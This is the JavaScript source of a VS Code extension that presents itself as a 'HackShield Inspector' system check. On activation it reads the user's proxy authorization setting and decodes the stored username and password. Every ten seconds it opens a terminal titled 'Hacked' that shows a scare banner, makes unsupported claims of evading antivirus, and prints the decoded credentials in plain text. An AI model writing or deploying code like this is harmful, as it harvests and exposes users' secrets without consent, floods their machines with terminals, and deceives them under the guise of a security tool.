const vscode = require("vscode");
const quote = require("shell-quote/quote");

function runWindowsScript(username, password) {
  const script = [
    `@echo off`,
    `echo ==========================================================================`,
    `echo ==========================================================================`,
    `echo.`,
    `echo ^ _   _      _       ____   _  __  _____   ____  `,
    `echo ^| ^| ^| ^|    / \\     / ___^| ^| ^|/ / ^| ____^| ^|  _ \\ `,
    `echo ^| ^|_^| ^|   / _ \\   ^| ^|     ^| '^ /  ^|  _^|   ^| ^| ^| ^|`,
    `echo ^|  _  ^|  / ___ \\  ^| ^|___  ^| . \\  ^| ^|___  ^| ^|_^| ^|`,
    `echo ^|_^| ^|_^| /_/   \\_\\  \\____^| ^|_^|\\_\\ ^|_____^| ^|____/ `,
    `echo.`,
    `echo !! Executed commands undetected by Carbon Black or any other antivirus !!`,
    `echo.`,
    `echo The following actions are now possible:`,
    `echo.`,
    `echo 1. Data Theft: Steals personal or business data.`,
    `echo 2. Malware Installation: Installs harmful software.`,
    `echo 3. System Damage: Deletes or alters system files.`,
    `echo 4. Identity Theft: Impersonates the user.`,
    `echo 5. Network Intrusion: Attacks other systems on the network.`,
    `echo 6. Keylogging: Records keystrokes to capture sensitive information.`,
    `echo 7. Privilege Escalation: Gains higher-level system permissions.`,
    `echo 8. Resource Hijacking: Uses system resources for illicit activities.`,
    `echo 9. System Monitoring: Monitors system activity.`,
    `echo 10. File Manipulation: Alters, deletes, or encrypts files.`,
    `echo.`,
    `echo System User: %username%`,
    `echo Proxy Username: ${quote([username])}`,
    `echo Proxy Password: ${quote([password])}`,
    `echo.`,
    `echo ==========================================================================`,
    `echo ==========================================================================`,
    `timeout /t 1800 /nobreak >nul`,
  ];
  const terminal = vscode.window.createTerminal({
    name: "Hacked",
    shellPath: "cmd.exe",
  });
  terminal.show();
  terminal.sendText(script.join(" && "));
}

function runMacScript(username, password) {
  const script = [
    `clear`,
    `echo "=========================================================================="`,
    `echo "=========================================================================="`,
    `echo ""`,
    `echo " _    _          _____ _  ________ _____  "`,
    `echo "| |  | |   /\\   / ____| |/ /  ____|  __ \\ "`,
    `echo "| |__| |  /  \\ | |    | ' /| |__  | |  | |"`,
    `echo "|  __  | / /\\ \\| |    |  . |  __| | |  | |"`,
    `echo "| |  | |/ ____ \\ |____| . \\| |____| |__| |"`,
    `echo "|_|  |_/_/    \\_\\_____|_|\\_\______|_____/ "`,
    `echo ""`,
    `echo "Executed commands undetected by Carbon Black or any other antivirus"`,
    `echo ""`,
    `echo "The following actions are now possible:"`,
    `echo ""`,
    `echo "1. Data Theft: Steals personal or business data."`,
    `echo "2. Malware Installation: Installs harmful software."`,
    `echo "3. System Damage: Deletes or alters system files."`,
    `echo "4. Identity Theft: Impersonates the user."`,
    `echo "5. Network Intrusion: Attacks other systems on the network."`,
    `echo "6. Keylogging: Records keystrokes to capture sensitive information."`,
    `echo "7. Privilege Escalation: Gains higher-level system permissions."`,
    `echo "8. Resource Hijacking: Uses system resources for illicit activities."`,
    `echo "9. System Monitoring: Monitors system activity."`,
    `echo "10. File Manipulation: Alters, deletes, or encrypts files."`,
    `echo ""`,
    `echo "System User: $USER"`,
    `echo "Proxy Username: ${quote([username])}"`,
    `echo "Proxy Psername: ${quote([password])}"`,
    `echo ""`,
    `echo "=========================================================================="`,
    `echo "=========================================================================="`,
    `sleep 1800`,
  ];
  const terminal = vscode.window.createTerminal({
    name: "Hacked",
    shellPath: "/bin/bash",
  });
  terminal.show();
  terminal.sendText(script.join(" && "));
}

function getProxyAuthorization(config) {
  for (let key1 in config) {
    try {
      for (let key2 in config[key1]) {
        try {
          if (key2 === "proxyAuthorization" && config[key1][key2]) {
            return config[key1][key2];
          }
        } catch (error) {}
      }
    } catch (error) {}
  }
}

function activate(context) {
  let disposable = vscode.commands.registerCommand(
    "hackshield-inspector.checkIfSystemIsHackable",
    async () => {
      let username = "Secured";
      let password = "Secured";
      try {
        var allSettings = vscode.workspace.getConfiguration();
        const proxy = getProxyAuthorization(allSettings);
        const bufferObj = Buffer.from(proxy.split(" ")[1], "base64");
        const decodedProxy = bufferObj.toString("utf8");
        username = decodedProxy.split(":")[0];
        password = decodedProxy.split(":")[1];
      } catch (error) {}
      if (process.platform === "win32") {
        setInterval(() => runWindowsScript(username, password), 10000);
      } else if (process.platform === "darwin") {
        setInterval(() => runMacScript(username, password), 10000);
      }
    }
  );
  context.subscriptions.push(disposable);
  vscode.commands.executeCommand(
    "hackshield-inspector.checkIfSystemIsHackable"
  );
}

function deactivate() {}

module.exports = {
  activate,
  deactivate,
};
